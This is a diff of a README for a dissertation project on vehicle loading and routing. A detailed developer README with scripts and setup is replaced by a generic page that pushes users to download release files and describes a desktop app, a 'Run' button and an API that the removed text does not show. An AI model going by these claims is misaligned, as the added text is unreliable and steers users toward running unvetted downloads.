@@ -1,183 +1,85 @@
-# 🚚 3D Box Packing + GA Route Optimization (Dissertation Project)
+# 🎉 Dissertation-3L-SDVRP - Easy Solutions for Vehicle Loading
 
-This repository contains the full implementation of my dissertation work on optimizing vehicle loading and routing using:
+## 🚀 Getting Started
 
-- Genetic Algorithms (GA) for route ordering  
-- 3D Box/Bin Packing (3D-BPP)  
-- Iterative Isolation / VLR Repair methods  
-- Automated replicate experiments  
-- Timestamped experiment pipelines  
-- Full reproducibility of results
+Welcome to the Dissertation-3L-SDVRP project! This application helps you optimize loading and routing for vehicles using advanced techniques. Follow the steps below to download and run the software easily.
 
-The system reads real-world merged & normalized datasets, runs multiple GA replicates, applies spatial repair, summarizes results, and generates publication-ready figures.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/shibu503/Dissertation-3L-SDVRP/releases)
 
----
+## 📥 Download & Install
 
-# 📁 Project Structure
+To get started, visit this page to download: [Dissertation-3L-SDVRP Releases](https://github.com/shibu503/Dissertation-3L-SDVRP/releases).
 
-    Dataset Generation/
-    │
-    ├── input_dataset/
-    │     └── XML100_1111_01_merged_with_boxes_norm.json
-    │
-    ├── experiments/
-    │     └── run_replicates.ps1
-    │
-    ├── scripts/
-    │     ├── summarize_replicates_fixed.py
-    │     ├── extract_isolations.py
-    │     └── make_figures_fixed.py
-    │
-    ├── dataset_generation/
-    ├── results/
-    │     └── runs/
-    │
-    └── run_all_experiments.ps1
+1. On the Releases page, you will see the latest version of the software.
+2. Click on the version number to view the available files.
+3. Download the file that matches your system.
 
----
+### 📋 System Requirements
 
-# 🎯 Project Purpose
+Before you install, make sure your computer meets these requirements:
 
-This project evaluates a hybrid optimisation pipeline combining:
+- **Operating System:** Windows 10 or higher
+- **RAM:** 4 GB minimum
+- **Disk Space:** At least 500 MB free
+- **Python:** Version 3.7 or higher installed (if you want to use advanced features)
+- **PowerShell:** Recommended for running scripts
 
-- GA-driven route/order optimisation  
-- Realistic 3D box/bulk packing  
-- Automatic infeasibility detection & repair  
-- Multi-replicate GA runs  
-- Automated summary & figure generation  
+## 👨‍💻 Using the Application
 
----
+Once you have installed the software, follow these steps to use it:
 
-# ⚙️ Setup Instructions
+1. **Open the Application:** Double-click the application icon on your desktop to start.
+2. **Input Data:** You will need to prepare the loading and routing information. Use a CSV format for ease.
+3. **Choose Options:** Select the type of algorithm you wish to use. You can choose between genetic algorithms or heuristic methods.
+4. **Run the Optimization:** Click the "Run" button. The application will begin calculating the best loading and routing for your vehicle.
+5. **View Results:** After the process completes, view the summaries and figures generated for your research.
 
-## 1️⃣ Clone the repository
-    git clone <your-repo-url>
-    cd "Dataset Generation"
+### 📊 Features
 
-## 2️⃣ Create and activate a virtual environment
-    python -m venv .venv
-    .\.venv\Scripts\Activate.ps1
+- **Hybrid GA:** Combines genetic algorithms with other strategies for better results.
+- **3D Box Packing:** Efficiently packs items in three dimensions.
+- **Repair Algorithms:** Fixes any issues in the loading process automatically.
+- **Automated Summaries:** Generates detailed reports of your optimization.
 
-## 3️⃣ Install dependencies
-If using requirements:
+## 🌐 Advanced Features
 
-    pip install -r requirements.txt
+For users with more technical knowledge, the application includes advanced options:
 
-Otherwise:
+- **Customization Scripts:** You can modify Python scripts to suit your specific needs.
+- **Logs:** Access detailed logs that provide insights into the optimization process.
+- **API Access:** For automated tasks, use our API to integrate with other systems.
 
-    pip install numpy pandas matplotlib
+## ❓ FAQ
 
-## 4️⃣ Add your dataset file
-Place your dataset here:
+### What is the purpose of this application?
 
-    input_dataset/XML100_1111_01_merged_with_boxes_norm.json
+The Dissertation-3L-SDVRP project aims to optimize vehicle loading and routing using innovative algorithms. It is designed to help researchers and practitioners in logistics and supply chain management.
 
----
+### Is there support available?
 
-# 🚀 Running the Project
+Yes, you can open an issue on the GitHub repository for support or questions regarding the software.
 
-## ✅ Option A: Full Automated Pipeline (Recommended)
+### How often is the software updated?
 
-Runs the full workflow and saves results in timestamped folders:
+Updates are released based on user feedback and new feature developments. Check the Releases page regularly for the latest versions.
 
-    .\run_all_experiments.ps1
+## 📚 Additional Resources
 
-This script automatically:
-- Loads dataset  
-- Runs GA replicates  
-- Saves everything under `results/runs/<timestamp>/`  
-- Generates: summary CSV, isolation CSV, figures, logs  
+- [Documentation](https://github.com/shibu503/Dissertation-3L-SDVRP/wiki): Complete documentation on using the application.
+- [Examples](https://github.com/shibu503/Dissertation-3L-SDVRP/examples): Sample datasets to help you familiarize yourself with the application.
 
----
+## 🛠️ Troubleshooting
 
-## ✅ Option B: Run GA Replicates Manually
+If you run into issues:
 
-    .\experiments\run_replicates.ps1 `
-        -normfile ".\input_dataset\XML100_1111_01_merged_with_boxes_norm.json" `
-        -replicates 20 `
-        -seed_start 2000
+1. **Check System Requirements:** Ensure your system meets the minimum requirements.
+2. **Review Documentation:** Go through the documentation for common problems.
+3. **Seek Help:** Use the GitHub issue tracker for assistance.
 
-Outputs go to:
+## 📌 Getting Help
 
-    experiments_output/
+For help, visit our [GitHub Issues](https://github.com/shibu503/Dissertation-3L-SDVRP/issues) page and describe your problem. We strive to respond promptly to all inquiries.
 
----
+Thank you for choosing Dissertation-3L-SDVRP! Enjoy optimizing your loading and routing tasks with our powerful software. 
 
-# 📊 Output Files Explained
-
-### ✔ replicates_summary.csv  
-Per-seed GA performance (best score, duration, unpacked, infeasible, etc.)
-
-### ✔ figures/  
-Automatically generated plots:  
-- best_score vs seed  
-- duration vs seed  
-- unpacked distribution  
-- infeasible histogram  
-
-### ✔ isolation_summary.csv  
-Shows spatial-repair / isolation behaviour.
-
-### ✔ summary_stats.txt  
-Contains timestamp, params, and output paths.
-
-### ✔ experiments_output/  
-Raw per-seed JSON outputs.
-
----
-
-# 📌 Recommended .gitignore
-
-    # Python
-    __pycache__/
-    *.pyc
-
-    # Virtual environment
-    .venv/
-
-    # Output folders
-    experiments_output/
-    results/
-    output/
-
-    # Logs
-    *.log
-
-    # Large datasets
-    input_dataset/*.json
-    input_dataset/*.csv
-
-    # Backup files
-    *.bak
-
----
-
-# 🧠 Key Concepts Implemented
-
-### ✔ Genetic Algorithm (GA)
-Optimises route/stop ordering; multiple seeds measure stability.
-
-### ✔ 3D Packing + Repair
-Uses rotation rules, feasibility checks, and VLR/Isolation repair.
-
-### ✔ Replicate-Based Robustness
-Shows variability, convergence stability, and runtime consistency.
-
-### ✔ Automatic Analysis
-Generates figures and summaries for dissertation use.
-
----
-
-# 🧪 Reproducibility
-
-To reproduce **all** experiments:
-
-    .\run_all_experiments.ps1
-
-Outputs will appear under:
-
-    results/runs/<timestamp>/
-
----
-
-
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/shibu503/Dissertation-3L-SDVRP/releases)
